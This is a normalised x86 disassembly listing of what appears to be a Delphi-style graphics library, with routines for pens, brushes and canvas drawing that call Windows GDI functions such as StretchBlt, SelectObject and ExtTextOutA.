retn
sub_424358
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423fc0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_423fd8
add esp 0x2c
pop esi
pop ebx
retn
sub_424380
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423398
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4243c4
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42347c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4243ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418bac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_42448b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423bac
xor eax eax
push ebp
push sub_42446e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4235a4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4245d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424475
mov eax [ ebp - 0x8 ]
call sub_423bbc
retn
sub_4244a4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4244bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_424501
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42352c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424508
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_424514
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4244a4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4244bc
add esp 0x10
pop esi
pop ebx
retn
sub_42453c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423380
xor eax eax
push ebp
push sub_4245c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42338c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423b68
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_4245f0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4244a4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4244bc
add esp 0x10
pop esi
pop ebx
retn
sub_424620
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4244a4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4244bc
sub_42464c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423398
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42468c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42347c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4246b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418bac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_424744
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423bac
xor eax eax
push ebp
push sub_424727
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4235a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42472e
mov eax [ ebp - 0x8 ]
call sub_423bbc
retn
sub_42475c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424778
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_4247bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42352c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4247c4
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_4247c8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424778
add esp 0x10
pop edi
pop esi
retn
sub_4247f4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_42475c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424778
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424828
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423380
xor edx edx
push ebp
push sub_4248f5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42338c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423b68
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424910
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42475c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424778
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424944
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425200
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424380
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425220
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42464c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425240
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4188ec
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_424a08
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418988
xor edx edx
mov eax esi
call sub_425038
mov eax [ esi + 0xc ]
call sub_403154
mov eax [ esi + 0x10 ]
call sub_403154
mov eax [ esi + 0x14 ]
call sub_403154
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_424a64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42508c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424aec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov eax [ ebx + 0x14 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416f24
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424b98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov eax [ ebx + 0x14 ]
call sub_424828
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424bd4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424c34
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424c60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424c98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424ce0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424d1c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_424fb8
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_424d48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov eax ebx
call sub_424d1c
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_404210
push eax
mov eax esi
call sub_404410
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_424e18
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_424c34
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_424e18
inc eax
add edi eax
sub_424dd4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404210
push eax
mov eax edi
call sub_404410
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_424e18
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424dd4
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424e34
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424dd4
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424e54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_424ea0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ea7
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424c0c
sub_424f00
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_424f24
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424c34
pop ecx
pop edx
pop edi
pop esi
retn
sub_424f44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_424f70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42508c
mov eax [ ebp + 0x8 ]
call sub_423b68
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424fd8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_425038
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_424fd8
mov edx esp
mov eax ebx
call sub_424f00
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_424f24
sub_42508c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_425128
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
test bl 0x8
je r-xdata
mov eax esi
call sub_425154
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_425184
sub_425128
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_42403c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_425154
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_42453c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_425184
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424828
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424828
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424908
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4247ec
call sub_423b68
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_4252a8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4252f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252f9
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4252fc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_425398
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_4252a8
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041c0
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42539f
lea eax [ ebp - 0x104 ]
call sub_403f50
retn
sub_4253b4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_425502
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425471
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4252fc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4252fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425509
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_425514
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4257c8
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4253a4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257cf
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
